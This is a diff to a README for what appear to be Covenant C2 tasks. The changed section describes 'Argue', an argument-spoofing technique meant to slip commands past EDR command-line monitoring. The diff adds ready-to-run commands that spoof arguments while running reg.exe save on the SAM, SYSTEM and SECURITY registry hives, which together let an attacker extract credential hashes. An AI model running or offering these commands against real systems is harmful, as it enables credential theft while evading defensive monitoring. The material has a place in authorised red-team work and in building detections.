@@ -46,6 +46,8 @@ Used this to demonstrate to someone I had popped their system ;).
 ### Argue.yaml
 Similar to cobalt's strike argue command for argument spoofing. This is a simple Covenant adaptation of FuzzySecurity's SwampThing code. Found it useful for bypassing commandline parsing for certain EDRs.  
 ```argue C:\Windows\System32\notepad.exe "real.txt" "fake.txt"```  
-```argue C:\Windows\System32\reg.exe "save HKLM\SAM C:\Users\Admin\Desktop\SAM" "whatever"```
+```argue C:\Windows\System32\reg.exe "save HKLM\SAM C:\Users\Admin\Desktop\SAM" "whatever"```  
+```argue C:\Windows\System32\reg.exe "save HKLM\SYSTEM C:\Users\Admin\Desktop\SYSTEM" "whatever"```  
+```argue C:\Windows\System32\reg.exe "save HKLM\SECURITY C:\Users\Admin\Desktop\SECURITY" "whatever"```
 
  **Please contribute if you have any**
